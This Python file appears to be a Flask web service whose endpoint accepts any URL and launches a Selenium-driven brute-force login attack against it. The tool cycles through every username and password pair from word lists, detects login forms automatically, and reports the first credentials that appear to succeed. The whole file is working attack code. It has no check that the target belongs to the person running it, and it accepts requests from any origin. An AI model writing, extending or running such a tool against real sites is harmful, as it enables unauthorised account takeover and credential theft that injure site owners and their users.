from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Load usernames from a file
def load_usernames(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

# Load passwords from a file
def load_passwords(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

# Perform brute force login
def brute_force_login(url):
    usernames = load_usernames('usernames.txt')
    passwords = load_passwords('passwords.txt')

    if not usernames or not passwords:
        socketio.emit("update", {"message": "Usernames or passwords file is empty. Exiting."})
        return {"success": False, "message": "Usernames or passwords file is empty."}

    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)

    try:
        driver.get(url)
        socketio.emit("update", {"message": f"Opened login page: {url}"})

        forms = driver.find_elements(By.TAG_NAME, "form")
        if not forms:
            socketio.emit("update", {"message": "No forms found on the page. Exiting."})
            return {"success": False, "message": "No forms found on the page."}

        socketio.emit("update", {"message": f"Found {len(forms)} form(s). Checking for username and password fields."})

        for form in forms:
            inputs = form.find_elements(By.TAG_NAME, "input")
            username_field, password_field = None, None

            for input_field in inputs:
                input_type = input_field.get_attribute("type")
                if input_type in ["text", "email"]:
                    username_field = input_field
                elif input_type == "password":
                    password_field = input_field

            if username_field and password_field:
                socketio.emit("update", {"message": "Username and password fields detected."})
                break
        else:
            socketio.emit("update", {"message": "No username/password fields detected. Exiting."})
            return {"success": False, "message": "No username/password fields detected."}

        for username in usernames:
            for password in passwords:
                # Emit the current username-password combination
                socketio.emit("update", {"message": f"Testing username: {username}, password: {password}"})

                try:
                    # Re-load the page to reset the form elements
                    driver.get(url)
                    time.sleep(1)  # Small delay to ensure page loads fully

                    # Locate fields again to avoid stale references
                    username_field = driver.find_element(By.NAME, "username")  # Adjust the name if needed
                    password_field = driver.find_element(By.NAME, "password")  # Adjust the name if needed

                    username_field.clear()
                    password_field.clear()
                    username_field.send_keys(username)
                    password_field.send_keys(password)
                    password_field.send_keys(Keys.RETURN)
                    
                    time.sleep(0.5)

                    # Check for success criteria
                    if "welcome" in driver.page_source.lower() or "logged in" in driver.page_source.lower():
                        success_message = f"Brute force successful! Username: {username}, Password: {password}"
                        socketio.emit("update", {"message": success_message})
                        return {"success": True, "message": success_message}
                except Exception as e:
                    socketio.emit("update", {"message": f"Error during login attempt: {str(e)}"})
                    continue

        socketio.emit("update", {"message": "Brute force failed. No valid credentials found."})
        return {"success": False, "message": "Brute force failed. No valid credentials found."}

    finally:
        driver.quit()

# Flask API Endpoint
@app.route("/api/test-brute-force", methods=["POST"])
def test_brute_force_endpoint():
    try:
        data = request.json
        url = data.get("url")

        if not url:
            return jsonify({"success": False, "message": "URL is required"}), 400

        result = brute_force_login(url)
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

if __name__ == "__main__":
    socketio.run(app, debug=True, port=5003)
